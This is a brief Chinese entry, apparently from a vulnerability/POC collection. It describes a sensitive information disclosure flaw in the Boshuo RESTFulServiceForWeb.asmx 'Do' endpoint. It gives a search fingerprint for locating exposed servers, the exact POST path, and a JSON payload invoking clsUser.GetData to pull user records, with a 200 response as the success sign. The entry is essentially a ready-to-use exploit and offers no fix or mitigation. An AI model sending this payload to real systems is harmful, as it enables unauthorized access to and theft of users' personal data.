# 博硕BGMRESTFulServiceForWeb.asmx_Do存在敏感信息泄露漏洞

博硕BGMRESTFulServiceForWeb.asmx_Do ｜ 信息泄露 ｜ —
- **指纹**：`body="Libs/Platform.lib"`
- **请求**：`POST /Service/RESTFulWebService/RESTFulServiceForWeb.asmx/Do?id= HTTP/1.1`

**Payload**
```
{"Resource":"MethodCluster","Parameter":[["Method","Sky.PlatForm.Core.clsUser.GetData"],["Para","{\"$VER$\":{},\"filter\":{\"OrderBy\":\"DeptId,UserId,CreateDate DESC\"}}"]]}
```
- **响应特征**：200